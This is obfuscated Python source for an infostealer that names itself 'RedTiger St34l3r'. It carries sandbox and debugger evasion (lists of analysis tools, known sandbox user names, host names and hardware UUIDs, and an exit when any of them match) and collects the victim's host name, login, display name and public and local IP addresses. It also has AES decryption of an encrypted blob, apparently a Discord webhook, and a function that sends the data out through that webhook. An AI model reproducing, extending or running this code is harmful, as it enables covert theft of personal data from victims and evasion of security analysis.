
def HYVIJCIDLXUMFVQWIHKXCAHHDVHXTXTOGOJYSVHCZXURHVHYUTEUJIUTYBFVENHCOQLFEZEUEMZYAOGHEUVKYNRFCMHI():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    ICKDEIXXWDKDOCXFAAGNSQNEQKWUXQEOZNECDCNOTWNCDFOTGXLTR = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    VFYYVPWKWEVQQQIYBTHVYOXFSEJHBLBOLYVOUEONEDGSIVZOPHQPSBQQOMMZCESUQYXCAPXBUK = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    RXJYGQDXQYECMWJSRLVEFIMVYMKDTIPJBBKDNOTRTPSNMYNXMJDVWHYFKBXOWMAIAZNXZOPKOREFEELKWDIFRKX = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    JLIFVXODMDTUFBNUCFFJWJDCPKQARHYOSSXQGUPMGDVXSRSXNPNNXDIPCJZKUJGYCQSXWXLE = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                RIODCGTPZHNCVGQBCXAJZZEIYIOONUEDGGZEMPPXFHYHMYPQSGULVRMZUIWRRONYZUPWNSEKNDMBOXDKAGE = str(v4r_proc.info['name']).lower()
                if any(debugger in RIODCGTPZHNCVGQBCXAJZZEIYIOONUEDGGZEMPPXFHYHMYPQSGULVRMZUIWRRONYZUPWNSEKNDMBOXDKAGE for debugger in JLIFVXODMDTUFBNUCFFJWJDCPKQARHYOSSXQGUPMGDVXSRSXNPNNXDIPCJZKUJGYCQSXWXLE):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in ICKDEIXXWDKDOCXFAAGNSQNEQKWUXQEOZNECDCNOTWNCDFOTGXLTR:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in ICKDEIXXWDKDOCXFAAGNSQNEQKWUXQEOZNECDCNOTWNCDFOTGXLTR]:
            return True
    except: pass

    try:
        if socket.gethostname() in VFYYVPWKWEVQQQIYBTHVYOXFSEJHBLBOLYVOUEONEDGSIVZOPHQPSBQQOMMZCESUQYXCAPXBUK:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in VFYYVPWKWEVQQQIYBTHVYOXFSEJHBLBOLYVOUEONEDGSIVZOPHQPSBQQOMMZCESUQYXCAPXBUK]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in RXJYGQDXQYECMWJSRLVEFIMVYMKDTIPJBBKDNOTRTPSNMYNXMJDVWHYFKBXOWMAIAZNXZOPKOREFEELKWDIFRKX:
            return True
    except: pass

    return False

try: FPXAWONBGAGLNZHYQDGROAKMXDPOFBJLUWPRWTIHTMETFGDMNJPIXGHFOZXNAOAYWOKEDE = HYVIJCIDLXUMFVQWIHKXCAHHDVHXTXTOGOJYSVHCZXURHVHYUTEUJIUTYBFVENHCOQLFEZEUEMZYAOGHEUVKYNRFCMHI()
except: FPXAWONBGAGLNZHYQDGROAKMXDPOFBJLUWPRWTIHTMETFGDMNJPIXGHFOZXNAOAYWOKEDE = False

if FPXAWONBGAGLNZHYQDGROAKMXDPOFBJLUWPRWTIHTMETFGDMNJPIXGHFOZXNAOAYWOKEDE == True:
    import sys
    sys.exit()

import sys

def USEHHOPETDZEHPSQDCNQEYWWNHRBCGLSQRPWAHOLVBHJZCNFJHXJQXMFDCVNWNNQIQJHRYUDHVQFZSZKOR():
    def LMUXZARFBARZDXVAPGUPFRAINJISYVOIMWLQSSHYNWDHGKUAWDFBHXTVOUVACESAODZUJZOLUVTFVEAGXRVWKCVTXILGP():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        TJFTPTYPHYIBMAOXZQTTYZOZNSMKBSUJBDLRMGGVRSISNCVCZRBUFQDCGAVBZMHFFQJZITMFPGNFN = LMUXZARFBARZDXVAPGUPFRAINJISYVOIMWLQSSHYNWDHGKUAWDFBHXTVOUVACESAODZUJZOLUVTFVEAGXRVWKCVTXILGP()
        if TJFTPTYPHYIBMAOXZQTTYZOZNSMKBSUJBDLRMGGVRSISNCVCZRBUFQDCGAVBZMHFFQJZITMFPGNFN == True:
            return TJFTPTYPHYIBMAOXZQTTYZOZNSMKBSUJBDLRMGGVRSISNCVCZRBUFQDCGAVBZMHFFQJZITMFPGNFN
    except:
        return True
    
if USEHHOPETDZEHPSQDCNQEYWWNHRBCGLSQRPWAHOLVBHJZCNFJHXJQXMFDCVNWNNQIQJHRYUDHVQFZSZKOR() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def GRGIABIEEKLGKIUSXPJPJIYAUSPEANEQKEIOBOTYJMFDZWQPPMAGVWSMEENGSNG(): pass
def OICSTXKROHBLZAKJAKREHGJHTNDXEWWDOPXFIHLVKTFBFAJCABUBRFZTRUXFEVSWJFUGIBRCZRDDQXZ(): pass
def KKXZCFLVOQOBSLWAUWKOHVJUSSSYMQKJCPXETBDXYTLENHAPZTUWUSASFBYOCSPKXBYXXALRTAIYOGRJQWXNDRNINOM(): pass
def OKSDMPPBNTFWBCSHNKGBWWJSZKCXXABLJYGSIMGYHUCAMYATQJCTALCBQMJQZTUP(): pass
def BHANHYPZGRPLVGHGGZYOFWJLQWUALUPFAUYFUDIDPKOLNWROBNSZYRVQOVDTG(): pass
def NMURYVOBWPGUWHUUUEVJSLVVCHLUZFPMNYBIRVDMFJYEBICOTIWHIHJIOUNSHKBGLBMQTUGQMWPMZWTIEHYAAZI(): pass
def JBNHKYJEHJFMMGOWCLFCOVBKTTCOFRFVOYNGQOSCUCKIVVLMWJFNMIMOIKCTTBGCTNAMVBJRNNJWULMT(): pass
def NJORNFAGUXPPAQJTFBCJDLYHIGVRZGRJZTPUPSFPISQDEJOLEHUFDXFRWPMOQYDFB(): pass
def PWBTEMFDRQRJMZNXFXANCUFBPOUHKAWEHCWJZAXZVEJZATLKGXKEXYKBRINEFVWFCIWUSLVALZQNELZQBVDN(): pass
def SVILZSOUMACPBBITXCTKUOUDEELEHAUZPLCARGUZDJXJWYUGFCQQFDVKFTLVBHVVDIGGOINBUHTMVSOWYKTMSWETVAUEXLCOH(): pass
def YEOXYOURZOAJVNUCKGSSOPWNWJABPCIDUGLGQJGQBZWRLSTCLEEFXVKRCGEAYTNFHQU(): pass
def ZMMACAIPONUIUVJDFVVNIAOSOPXQWNBOLSXCZUZTVYUNKGNHFQGDUHSBELHWTDN(): pass
def BPIYFHUVOHJYAMAERUTZRHVKVBULUOBOCQAHLLLZNUOLRLRVUZATHTSCYTWKVXCJSNGTFWBSLBVHKGNWWFFHNAQTFGBGKKDTIYDK(): pass
def EZUBFDNYIZFPKWUARMNFBJIPEKNTEKPKMJOWJZTGTNFJJKKJLRLDFUOTLRDT(): pass
def TKOCOXTFSCVEIUPONGWZPXJIXIXJLCTJUMFTNMYOZWBOHIERPVPKWAAPYPGGTGNBZBGVCVJNBQMTVMXHKUZACXKRVCPCVHUTK(): pass
def ECUMEQPGGTPOMTIZXYYNYMWCUMMNPDDTPGOCBWDRQPHJDOXAWFZHXDCSBUAFFVSAIYKMOQDGXEZBNKADWIBXRGKY(): pass
def TMGHOLFRPKALVUGMCLRBBDVCHSZDKFIFFMXSFZTRDJKSJYESPIMSFYLBKRYQFKMPLEAQQJYOZXFZERYBYAGPIPHXNWUJ(): pass
def OPSLLUKZHAOQOYMNQKCTOOTACPNZIUSLWHDMZRCDDCKLGTTPVMQZOVHPVQIHKSUTTYLTCYCCRNCZTUQP(): pass
def KWMYUVODLOTHGPKCBCUAXBSYXOCJQKUPGDRJQPCBCFQWKJZQQACEXWYOMZNORTXNEQOZYLHAUUTPBKWLSDK(): pass
def HPIEEUTKYTYWQSVXICTCNMSAEOLPBPFTEVGXSSXOLLRSZVKKLJAYLWJJOVOZSBADZQETRIGONHTBKDXJQETRQKGQHRDN(): pass

def HHNDDPEDUIPODFIEGZPKTOMSYWFILBPGDXPURXRKOSXXDXKNAVCDQSMCXDFKFRJFRXEXQTEICHUWGGKTRQDWLBRKOJCKSZL(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW
        )
        embed.set_footer(text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
        client.send(embed=embed, username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
    except: pass

def VHKUDXUITCUNCWCCQFTEYSLUFTYATCDXHKSQFRFSLXWZOGLZLKQWUBXHSZBPTUJVTYHNORL(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def HZONQDDAYEICBXJHMFUWBHMUYNUJGGQPTQPAFPIRQCSDZLPTMUASGPEOOAOOEQRLLYETTSYOUZKTHVNRAABGKIPFEJDSYOTGP():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTL(UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM, HVMZDJJJJZROHTVFCMBPNWEXKPELIQPOGBNXWZVOMGWUCFKUZKTFSAIZQFZXPYWJDKOGWJIXGHMYJXJLSSPOUGAYLPUDTDIRU):
    def CUTVODNQWVFKKYOLSCKIKNULZRYYPHDLIMEMTJPRKEGKAGMGFGXAARXXFTTJOK(RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ, DQYWYUTQYMUQGNUVVCINDYBIVYDNOHPKMUNIUALSHJNRJYGDNZIJERHCISRXACOTMDMBWZXJOOJAV):
        SOELCLLZTJHDQMLHVJVSVYRXSBKQWZQIRXQKAVMKXFVYZGVLPOODAUNRQRFQZDPYUBRKDAPSKCVPFHPJHWI = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=DQYWYUTQYMUQGNUVVCINDYBIVYDNOHPKMUNIUALSHJNRJYGDNZIJERHCISRXACOTMDMBWZXJOOJAV, iterations=100000, backend=default_backend())
        if isinstance(RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ, str):  
            RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ = RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ.encode()  
        return SOELCLLZTJHDQMLHVJVSVYRXSBKQWZQIRXQKAVMKXFVYZGVLPOODAUNRQRFQZDPYUBRKDAPSKCVPFHPJHWI.derive(RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ)

    UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_data = base64.b64decode(UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM)
    DQYWYUTQYMUQGNUVVCINDYBIVYDNOHPKMUNIUALSHJNRJYGDNZIJERHCISRXACOTMDMBWZXJOOJAV = UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_data[:16]
    SGUWMJOBRUSBMKVJHRRQDFBSBHZBNALZYOYZBXBUXNNPJNNINHKGEHAZXEWFKIPBNLZSPUNUMBYOZRPPGOUBFBMSXZVMZ = UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_data[16:32]
    UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_data = UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_data[32:]
    GGVRVHDKDVAIUMJQDNHCNPJGECPIEXGTHOIUNGIGADPBWPJTATHVXYOKTNYQTCCFSMIPLHCQICAWRXFPKT = CUTVODNQWVFKKYOLSCKIKNULZRYYPHDLIMEMTJPRKEGKAGMGFGXAARXXFTTJOK(HVMZDJJJJZROHTVFCMBPNWEXKPELIQPOGBNXWZVOMGWUCFKUZKTFSAIZQFZXPYWJDKOGWJIXGHMYJXJLSSPOUGAYLPUDTDIRU, DQYWYUTQYMUQGNUVVCINDYBIVYDNOHPKMUNIUALSHJNRJYGDNZIJERHCISRXACOTMDMBWZXJOOJAV)
    CVSKSLNEDMPJYNODEATOMYXAHOKQGCDVPYSORBGRNIXWDSCPHRKMXSJUMXRZQUAFZETIYMLHINZPOBISVSIB = Cipher(algorithms.AES(GGVRVHDKDVAIUMJQDNHCNPJGECPIEXGTHOIUNGIGADPBWPJTATHVXYOKTNYQTCCFSMIPLHCQICAWRXFPKT), modes.CBC(SGUWMJOBRUSBMKVJHRRQDFBSBHZBNALZYOYZBXBUXNNPJNNINHKGEHAZXEWFKIPBNLZSPUNUMBYOZRPPGOUBFBMSXZVMZ), backend=default_backend())
    OZYLFDHGZMRSTXWWKCEAUNQYROFQMUWFQLERCOSIXCJDMZGHANA = CVSKSLNEDMPJYNODEATOMYXAHOKQGCDVPYSORBGRNIXWDSCPHRKMXSJUMXRZQUAFZETIYMLHINZPOBISVSIB.decryptor()
    GOOSGMPNXVJDKXJFMDQANZUGIOGQHEWIYWICNXUZLGTZRHXBBHHNXDNICEEWVPEZEDXPGGYNQQQVMDXETFFGSIN = OZYLFDHGZMRSTXWWKCEAUNQYROFQMUWFQLERCOSIXCJDMZGHANA.update(UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_data) + OZYLFDHGZMRSTXWWKCEAUNQYROFQMUWFQLERCOSIXCJDMZGHANA.finalize()
    YRKLVSFLESHVULKMOCXQNPPUVDJTNDEDHFSRGFKUJDTMDPLBQIJ = padding.PKCS7(128).unpadder()
    WQGWCZVAVDAHHKZBIQXGHXXZJIGPHODGUCPWCFPRPZLICKCOUCVJXJUBLQWHZAQSWWK = YRKLVSFLESHVULKMOCXQNPPUVDJTNDEDHFSRGFKUJDTMDPLBQIJ.update(GOOSGMPNXVJDKXJFMDQANZUGIOGQHEWIYWICNXUZLGTZRHXBBHHNXDNICEEWVPEZEDXPGGYNQQQVMDXETFFGSIN) + YRKLVSFLESHVULKMOCXQNPPUVDJTNDEDHFSRGFKUJDTMDPLBQIJ.finalize()
    return WQGWCZVAVDAHHKZBIQXGHXXZJIGPHODGUCPWCFPRPZLICKCOUCVJXJUBLQWHZAQSWWK.decode()

VHKUDXUITCUNCWCCQFTEYSLUFTYATCDXHKSQFRFSLXWZOGLZLKQWUBXHSZBPTUJVTYHNORL("")

try: BQABHNEQSCJXQWTORKKOOFXCXUWNUBQAVWGUDDIGSXDAWMEIHWHMLQAADGNBAPXZFKQTMLRVJK    = socket.gethostname()
except: BQABHNEQSCJXQWTORKKOOFXCXUWNUBQAVWGUDDIGSXDAWMEIHWHMLQAADGNBAPXZFKQTMLRVJK = "None"

try: XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC    = os.getlogin()
except: XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC = "None"

try: PBHDZKEIQVGPXEELEIRFFETTMPYQUMYWQDYIHHNNGSXHHEWRCSAQBJQJDNGWO    = win32api.GetUserNameEx(win32api.NameDisplay)
except: PBHDZKEIQVGPXEELEIRFFETTMPYQUMYWQDYIHHNNGSXHHEWRCSAQBJQJDNGWO = "None"

try: EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR = "None"

try: SMXNGOXXFPOCNEVSVQOWBJLOEYNURFTFSAYFGQJNZUYNQJQHDIQJBWHHKTHWYXXFCMEFLIVZIEFJGTJ    = socket.gethostbyname(socket.gethostname())
except: SMXNGOXXFPOCNEVSVQOWBJLOEYNURFTFSAYFGQJNZUYNQJQHDIQJBWHHKTHWYXXFCMEFLIVZIEFJGTJ = "None"

WYHMMDEBGDDHQVAUGIOHZLCWVSFMBQAMUQFKRSMSLVSDEHCSYQWMSPBBIXDKNTMASVWWMKXUROVJKCSNIQRSTNPKANHWD = r"""
mqyZU0h4GYAJgHLgIoyBat+BseNW1aLN9PYTBnKJOnSEgf88N5lx1IBvrln2iJDvDEijTH3MgHua1UGD9O/b7gnC/VZNsw8YHskiCSnHdUyDAA90uOOPL/ytQpLRvX9mzzgSzf9nIx5UyWDrABvlQri43hlQk+cY3WE5nTMczKvHnAioe1mSAtKqY7715RkNa2v/ijs/TS/epGuJGyd6MQ==
"""

FEZBJSDIYFKCAARDAQOYXUYFOUFLRCJTBISQQDJIKMWLSBKLZJASJOSRNXWTZSUCJ            = "TpAmexGiwbEeqLQKRUgEkBowVZnnyDcVfnCEvPOgwPcrcEXbGrJGOOOocCZsYGQqqUDmwCABRmhQZYiBWJbcjLQplETUYkqCmMbITIXiIdNgAMafnpDgsnykbxejLm"
GGYBSNCVBTUYBNDFDGHQMRYTVCTGXVEAYKTUIZXFRWWKKWMHQWAQKTSJKFMAADATTKAEF        = "redtiger.shop"
EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW    = 0xa80505
BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS = "RedTiger St34l3r"
HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
HVTSMJZXOGSNAXQACUQKHLURRYDAUGPYRXKJYMDQMGTMIKURJYFU   = {"text": GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, "icon_url": HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ}
NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB    = f'`{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC} "{EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}"`'
